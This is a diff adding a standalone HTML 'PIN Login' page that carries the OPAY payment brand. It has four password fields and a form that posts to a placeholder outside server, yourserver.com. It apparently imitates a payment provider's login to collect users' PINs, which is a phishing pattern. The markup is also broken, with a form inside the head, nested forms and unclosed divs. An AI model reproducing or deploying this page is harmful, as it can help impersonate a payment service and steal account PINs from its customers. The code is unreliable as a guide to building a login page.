@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIN Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .pin-container {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 300px;
+            text-align: center;
+        }
+        .pin-container h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .pin-inputs input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 18px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .pin-container button {
+            width: 100%;
+            padding: 10px;
+            background-color:lightgreen;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .pin-container button:hover {
+            background-color:lightgreen;
+        }
+    </style>
+     <form action="https://yourserver.com/process-login" method="POST">
+    <script>
+        function handlePinSubmit(event) {
+            event.preventDefault(); // Prevent form submission for now
+            const pinInputs = document.querySelectorAll('.pin-input');
+            let pin = '';
+            pinInputs.forEach(input => {
+                pin += input.value;
+            });
+
+            if (pin.length === 4) {
+                alert(`Entered PIN: ${pin}`); // For demonstration
+                // Here, you would typically send the PIN to your backend server
+                // Example: fetch('/verify-pin', { method: 'POST', body: JSON.stringify({ pin }) });
+            } else {
+                alert('Please enter a 4-digit PIN.');
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="pin-container">
+        <h2>Enter Your PIN</h2>
+        <form onsubmit="handlePinSubmit(event)">
+            <div class="pin-inputs">
+                <input type="password" maxlength="1" class="pin-input" required>
+                <input type="password" maxlength="1" class="pin-input" required>
+                <input type="password" maxlength="1" class="pin-input" required>
+                <input type="password" maxlength="1" class="pin-input" required>
+            </div>
+            <div class="login-container">
+                <h2>OPAY</h2>
+                    <div class="form-group">
+
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</body>
+</html>
